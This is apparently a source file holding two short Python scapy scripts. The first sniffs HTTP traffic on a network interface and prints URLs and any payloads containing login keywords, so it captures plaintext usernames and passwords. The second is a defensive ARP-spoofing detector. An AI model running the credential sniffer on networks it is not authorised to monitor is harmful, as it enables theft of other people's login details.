import scapy.all as scapy
from scapy.layers import http
import argparse

def get_argument():
	parser=argparse.ArgumentParser()
	parser.add_argument("-i","--interface",dest="interface",help="Interface to sniff packet")
	options=parser.parse_args()
	return options

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=sniffed_packet)

def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
			load=packet[scapy.Raw].load
			keywords=["username","user","login","password","pass"]
			for keyword in keywords:
				if keyword in str(load):
					return load 

def sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url=get_url(packet)
		print("HTTP Request "+str(url))
		login_info=get_login_info(packet)
		if login_info:
			print("\n\n Possible username/password "+str(login_info)+"\n\n")

option=get_argument()
sniff(option.interface)
		

import scapy.all as scapy
import argparse

def get_argument():
	parser=argparse.ArgumentParser()
	parser.add_argument("-i","--interface",dest="interface",help="Interface to sniff packet")
	options=parser.parse_args()
	return options

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=sniffed_packet)

def get_mac(ip):
	arp_request=scapy.ARP(pdst=ip)
	broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast=broadcast/arp_request
	answered_list=scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
	return answered_list[0][1].hwsrc

def sniffed_packet(packet):
	if packet.haslayer(scapy.ARP) and packet[scapy.ARP].op==2:
		try:
			real_mac=get_mac(packet[scapy.ARP].psrc)
			response_mac=packet[scapy.ARP].hwsrc

			if real_mac !=response_mac:
				print("Warning!!!You are under ARP Poisioning attack")
		except IndexError:
			pass

option=get_argument()
sniff(option.interface)
		

